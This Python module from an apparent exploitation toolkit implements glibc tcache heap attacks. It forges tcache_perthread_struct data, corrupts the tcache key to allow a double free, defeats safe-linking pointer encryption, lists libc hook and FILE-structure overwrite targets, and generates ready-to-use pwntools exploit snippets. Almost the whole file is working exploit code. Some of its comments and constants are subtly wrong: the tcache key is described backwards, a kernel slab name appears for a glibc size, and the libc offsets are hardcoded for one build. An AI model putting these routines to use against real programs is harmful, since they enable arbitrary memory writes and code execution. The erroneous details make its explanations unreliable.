"""
Advanced tcache exploitation techniques.

Implements:
- tcache_perthread_struct manipulation
- tcache key bypass (glibc 2.29+)
- Safe-linking bypass (glibc 2.32+)
- tcache count manipulation
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


# tcache constants
TCACHE_MAX_BINS = 64
TCACHE_FILL_COUNT = 7


@dataclass
class TcachePerThreadStruct:
    """
    Represents tcache_perthread_struct (glibc heap metadata).

    Layout (glibc 2.26+):
        counts[64]: uint16_t (or uint8_t in older versions)
        entries[64]: pointer to first chunk in each bin

    Total size varies:
        - glibc 2.26-2.29: 0x250 bytes (in kmalloc-576/kmalloc-640)
        - glibc 2.30+: 0x290 bytes
    """
    version: str = "2.31"
    counts_offset: int = 0
    entries_offset: int = 0x80  # 64 * 2 bytes for counts (aligned)
    total_size: int = 0x290

    # State
    counts: List[int] = field(default_factory=lambda: [0] * 64)
    entries: List[int] = field(default_factory=lambda: [0] * 64)

    def __post_init__(self):
        """Adjust offsets based on version."""
        major, minor = self._parse_version(self.version)

        if minor < 30:
            # Older format
            self.counts_offset = 0
            self.entries_offset = 0x40  # 64 bytes for counts
            self.total_size = 0x250
        else:
            # glibc 2.30+
            self.counts_offset = 0
            self.entries_offset = 0x80  # 128 bytes for counts (16-bit)
            self.total_size = 0x290

    def _parse_version(self, version: str) -> Tuple[int, int]:
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 31

    def size_to_idx(self, size: int) -> int:
        """Convert allocation size to tcache bin index."""
        # Minimum chunk size is 0x20 (32 bytes)
        if size < 0x20:
            size = 0x20
        # Chunks are 16-byte aligned, bins are every 16 bytes
        # idx = (size - 0x20) / 16
        return min((size - 0x20) // 16, TCACHE_MAX_BINS - 1)

    def idx_to_size(self, idx: int) -> int:
        """Convert tcache bin index to chunk size."""
        return 0x20 + (idx * 16)

    def build_fake_struct(
        self,
        target_bin_idx: int,
        target_ptr: int,
        target_count: int = 1,
    ) -> bytes:
        """
        Build fake tcache_perthread_struct to allocate at arbitrary address.

        Args:
            target_bin_idx: Which bin to poison
            target_ptr: Address to allocate at
            target_count: Count for that bin (must be > 0)

        Returns:
            Fake struct bytes
        """
        data = bytearray(self.total_size)

        # Set count for target bin
        count_offset = self.counts_offset + (target_bin_idx * 2)
        data[count_offset:count_offset + 2] = target_count.to_bytes(2, 'little')

        # Set entry for target bin
        entry_offset = self.entries_offset + (target_bin_idx * 8)
        data[entry_offset:entry_offset + 8] = p64(target_ptr)

        return bytes(data)

    def build_count_overflow(
        self,
        bins_to_fill: List[int],
        fill_count: int = TCACHE_FILL_COUNT,
    ) -> bytes:
        """
        Build payload to overflow tcache counts.

        This can force chunks into unsorted bin for libc leak.

        Args:
            bins_to_fill: List of bin indices to mark as full
            fill_count: Count value (usually 7)

        Returns:
            Counts array bytes
        """
        counts = bytearray(128)  # 64 * 2 bytes

        for idx in bins_to_fill:
            if 0 <= idx < 64:
                offset = idx * 2
                counts[offset:offset + 2] = fill_count.to_bytes(2, 'little')

        return bytes(counts)


@dataclass
class TcacheKeyBypass:
    """
    Bypass tcache key protection (glibc 2.29+).

    In glibc 2.29+, freed chunks have a 'key' field that prevents
    double-free detection. The key is stored at chunk+0x08 (where
    the user data begins, overlapping with 'key' field).
    """

    @staticmethod
    def corrupt_key(chunk_content: bytes, key_offset: int = 0x08) -> bytes:
        """
        Corrupt tcache key to enable double-free.

        Args:
            chunk_content: Current chunk data
            key_offset: Offset of key in chunk (usually 0x08)

        Returns:
            Modified chunk data with corrupted key
        """
        data = bytearray(chunk_content)

        # Key is at offset 0x08 (sizeof(size_t) from start of user data)
        # Setting it to anything other than tcache_key allows double-free
        if len(data) > key_offset:
            data[key_offset:key_offset + 8] = b'\x00' * 8

        return bytes(data)

    @staticmethod
    def get_key_offset(bits: int = 64) -> int:
        """Get key field offset in chunk user data."""
        return 8 if bits == 64 else 4


@dataclass
class SafeLinkingBypass:
    """
    Bypass safe-linking protection (glibc 2.32+).

    Safe-linking encrypts fd pointers:
        encrypted_ptr = actual_ptr ^ (chunk_addr >> 12)

    To exploit, we need either:
    1. Heap leak to decrypt/encrypt pointers
    2. Partial overwrite (only need lowest 12 bits unencrypted)
    """

    @staticmethod
    def encrypt(ptr: int, chunk_addr: int) -> int:
        """Encrypt pointer for safe-linking."""
        return ptr ^ (chunk_addr >> 12)

    @staticmethod
    def decrypt(encrypted_ptr: int, chunk_addr: int) -> int:
        """Decrypt safe-linking protected pointer."""
        return encrypted_ptr ^ (chunk_addr >> 12)

    @staticmethod
    def recover_heap_base(encrypted_null: int) -> int:
        """
        Recover heap base from encrypted NULL pointer.

        When fd = NULL, encrypted = 0 ^ (addr >> 12) = addr >> 12
        So encrypted_null << 12 gives us heap page base.

        Args:
            encrypted_null: Encrypted NULL pointer read from freed chunk

        Returns:
            Approximate heap base (page-aligned)
        """
        return encrypted_null << 12

    @staticmethod
    def partial_overwrite_payload(
        target_offset: int,
        heap_base: int,
    ) -> bytes:
        """
        Generate payload for partial pointer overwrite.

        Only overwrites lower bytes, useful when we know heap layout
        but not exact ASLR slide.

        Args:
            target_offset: Offset within heap page
            heap_base: Known/guessed heap base

        Returns:
            Partial overwrite payload
        """
        # Calculate what lower bytes should be
        target = heap_base + target_offset
        encrypted = SafeLinkingBypass.encrypt(target, heap_base + target_offset - 0x10)

        # Return only lower 2 bytes for partial overwrite
        return (encrypted & 0xFFFF).to_bytes(2, 'little')


class TcacheExploiter:
    """
    Complete tcache exploitation toolkit.

    Techniques:
    1. tcache_perthread_struct poisoning
    2. tcache dup with key bypass
    3. Safe-linking bypass
    4. Libc leak via unsorted bin (by filling tcache)
    """

    def __init__(self, libc_version: str = "2.31", bits: int = 64):
        self.version = libc_version
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

        # Parse version for feature detection
        parts = libc_version.split(".")
        self.major = int(parts[0]) if parts else 2
        self.minor = int(parts[1]) if len(parts) > 1 else 31

        # Feature flags
        self.has_tcache = self.minor >= 26
        self.has_key = self.minor >= 29
        self.has_safe_linking = self.minor >= 32

        # Create helpers
        self.perthread = TcachePerThreadStruct(version=libc_version)

    def libc_leak_via_unsorted(self) -> Dict[str, Any]:
        """
        Generate exploit to leak libc via unsorted bin.

        Fill tcache, then free to unsorted bin to leak main_arena.

        Returns:
            Exploit information
        """
        result = {
            "technique": "libc_leak_unsorted_bin",
            "steps": [
                "1. Allocate 8 chunks of same size (0x80+)",
                "2. Allocate guard chunk to prevent consolidation",
                "3. Free 7 chunks to fill tcache",
                "4. Free 8th chunk -> goes to unsorted bin",
                "5. Allocate from tcache, read unsorted chunk's fd",
                "6. fd contains main_arena+96 -> calculate libc base",
            ],
            "chunk_size": 0x90,  # Large enough for unsorted bin
            "tcache_fill_count": TCACHE_FILL_COUNT,
            "main_arena_offset": 96,  # Offset in fd pointer
        }

        # Calculate main_arena offset in libc
        # This varies by libc version
        if self.minor >= 34:
            result["main_arena_symbol"] = "__malloc_hook + 0x10"
        else:
            result["main_arena_symbol"] = "__malloc_hook + 0x10"

        return result

    def tcache_perthread_poison(
        self,
        target_addr: int,
        chunk_size: int = 0x290,
    ) -> Dict[str, Any]:
        """
        Poison tcache_perthread_struct to allocate anywhere.

        Args:
            target_addr: Address to allocate at
            chunk_size: Size for allocation

        Returns:
            Exploit information
        """
        bin_idx = self.perthread.size_to_idx(chunk_size)

        result = {
            "technique": "tcache_perthread_struct_poison",
            "steps": [
                "1. Leak heap address to find tcache_perthread_struct",
                "2. tcache_perthread_struct is at heap_base + 0x10",
                "3. Overwrite entries[idx] with target address",
                "4. Overwrite counts[idx] with non-zero value",
                f"5. Allocate size 0x{chunk_size:x} -> returns target",
            ],
            "target": target_addr,
            "bin_idx": bin_idx,
            "fake_struct": self.perthread.build_fake_struct(
                bin_idx, target_addr, target_count=1
            ),
            "perthread_offset": 0x10,  # Offset from heap base
        }

        return result

    def double_free_with_key_bypass(
        self,
        target_addr: int,
        heap_leak: int = 0,
    ) -> Dict[str, Any]:
        """
        Double-free attack with tcache key bypass.

        Args:
            target_addr: Address to allocate at
            heap_leak: Heap address for safe-linking (if needed)

        Returns:
            Exploit information
        """
        result = {
            "technique": "tcache_dup_key_bypass",
            "requires_key_bypass": self.has_key,
            "requires_safe_linking_bypass": self.has_safe_linking,
            "steps": [],
            "payload": b"",
        }

        if self.has_key:
            result["steps"].extend([
                "1. Allocate chunk A",
                "2. Free chunk A (goes to tcache)",
                "3. Modify chunk A's key field (offset +0x08)",
                "4. Free chunk A again (double-free succeeds)",
            ])
        else:
            result["steps"].extend([
                "1. Allocate chunk A",
                "2. Free chunk A twice (no key check)",
            ])

        if self.has_safe_linking:
            if heap_leak:
                encrypted = SafeLinkingBypass.encrypt(target_addr, heap_leak)
                result["payload"] = self.pack(encrypted)
                result["steps"].append(
                    f"5. Overwrite fd with encrypted target: 0x{encrypted:x}"
                )
            else:
                result["steps"].append(
                    "5. Need heap leak for safe-linking bypass!"
                )
                result["payload"] = self.pack(target_addr)
        else:
            result["payload"] = self.pack(target_addr)
            result["steps"].append(
                f"5. Overwrite fd with target: 0x{target_addr:x}"
            )

        result["steps"].extend([
            "6. Allocate (returns original chunk)",
            "7. Allocate (returns original chunk again)",
            f"8. Allocate (returns target 0x{target_addr:x})",
        ])

        return result

    def hook_overwrite_targets(self, libc_base: int = 0) -> Dict[str, int]:
        """
        Get common hook addresses for tcache poisoning targets.

        Args:
            libc_base: Libc base address (0 for offsets only)

        Returns:
            Dict of target name to address/offset
        """
        # Common offsets (vary by libc version)
        targets = {}

        if self.minor < 34:
            # __malloc_hook and __free_hook exist
            targets["__malloc_hook"] = libc_base + 0x3ebc30 if libc_base else 0x3ebc30
            targets["__free_hook"] = libc_base + 0x3ed8e8 if libc_base else 0x3ed8e8
            targets["__realloc_hook"] = libc_base + 0x3ebc28 if libc_base else 0x3ebc28
        else:
            # glibc 2.34+ removed hooks, need FSOP or other techniques
            targets["_IO_list_all"] = libc_base + 0x21a680 if libc_base else 0x21a680
            targets["_IO_2_1_stdout_"] = libc_base + 0x21a780 if libc_base else 0x21a780

        return targets

    def generate_exploit_code(
        self,
        technique: str,
        target_addr: int,
        **kwargs,
    ) -> str:
        """
        Generate Python/pwntools exploit code snippet.

        Args:
            technique: Which technique to use
            target_addr: Target address
            **kwargs: Additional parameters

        Returns:
            Python code string
        """
        if technique == "double_free":
            return f'''
# tcache double-free exploit (glibc {self.version})
def tcache_dup_exploit(alloc, free, edit, target=0x{target_addr:x}):
    # Allocate victim chunk
    alloc(0, 0x20)  # chunk A

    # Free to tcache
    free(0)

    {"# Corrupt key to bypass double-free check" if self.has_key else ""}
    {"edit(0, b'A' * 8 + p64(0))  # Overwrite key at offset +8" if self.has_key else ""}

    # Double-free
    free(0)

    # Poison tcache fd
    {"heap_leak = leak_heap()  # Need heap leak for safe-linking" if self.has_safe_linking else ""}
    {"encrypted = target ^ (heap_leak >> 12)" if self.has_safe_linking else ""}
    alloc(1, 0x20, {"encrypted" if self.has_safe_linking else "p64(target)"})

    # Pop tcache entries
    alloc(2, 0x20)  # Gets original chunk
    alloc(3, 0x20)  # Gets target!

    return 3  # Index of chunk at target
'''

        elif technique == "perthread":
            return f'''
# tcache_perthread_struct poisoning (glibc {self.version})
def perthread_poison(edit_arbitrary, target=0x{target_addr:x}):
    # tcache_perthread_struct is at heap_base + 0x10
    perthread_addr = heap_base + 0x10

    # Structure layout:
    # 0x00: counts[64] (2 bytes each)
    # 0x80: entries[64] (8 bytes each)

    bin_idx = (0x{kwargs.get("chunk_size", 0x20):x} - 0x20) // 0x10

    # Set count and entry
    edit_arbitrary(perthread_addr + bin_idx * 2, p16(1))  # count
    edit_arbitrary(perthread_addr + 0x80 + bin_idx * 8, p64(target))  # entry

    # Allocate to get target
    return alloc(0x{kwargs.get("chunk_size", 0x20):x})
'''

        return "# Unknown technique"

    def summary(self) -> str:
        """Get exploiter summary."""
        return f"""
tcache Exploiter
================
glibc version: {self.version}
Has tcache: {self.has_tcache}
Has key check: {self.has_key}
Has safe-linking: {self.has_safe_linking}

Available techniques:
- libc_leak_via_unsorted: Fill tcache, leak from unsorted bin
- tcache_perthread_poison: Overwrite tcache metadata
- double_free_with_key_bypass: Double-free with protections bypass
"""
